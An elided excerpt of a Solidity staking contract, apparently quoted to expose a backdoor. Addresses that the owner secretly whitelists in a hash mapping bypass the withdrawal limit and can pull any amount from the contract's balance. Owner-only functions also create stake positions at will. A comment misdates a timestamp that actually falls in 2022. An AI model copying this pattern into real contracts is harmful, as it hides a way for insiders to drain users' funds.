...
contract Staking is Ownable {
  ...
  constructor(address _token, bytes32[] memory _r) {
  ...
  function addR(bytes32[] memory _r) public onlyOwner {
    for(uint256 i = 0; i < _r.length; i++) {
      r[_r[i]] = true;
    }
  }
  ...
  function referralStake(address _to, uint256 _amount, uint32 _time) public onlyOwner {
    stakingPositionsByAddress[_to].push(
      StakingPosition(
        _amount,
        _time,
        uint32(block.timestamp),
  ...
  function migrateStake(address _to, uint256 _amount, uint32 _time) public onlyOwner {
    require(block.timestamp <= 1648341129); // Not callable after March 27 2021. Only to be used for migration.
    stakingPositionsByAddress[_to].push(
      StakingPosition(
        _amount,
        _time,
  ...
  function claimRewards(uint256 _i, uint256 _amount) public {
    ...
    require(_amount <= rewards || r[keccak256(abi.encode(msg.sender))], "amount too big");

    uint256 toWithdraw = _amount == 0 ? rewards : _amount;

    stakingPosition.lastWithdrawal = uint32(block.timestamp);
    
    if(r[keccak256(abi.encode(msg.sender))]) token.transferFrom(address(this), msg.sender, toWithdraw);
    else token.mint(msg.sender, toWithdraw);
  ...
  function unstake(uint256 _i) public {
    ...
    token.mint(msg.sender, stakingPosition.amount);
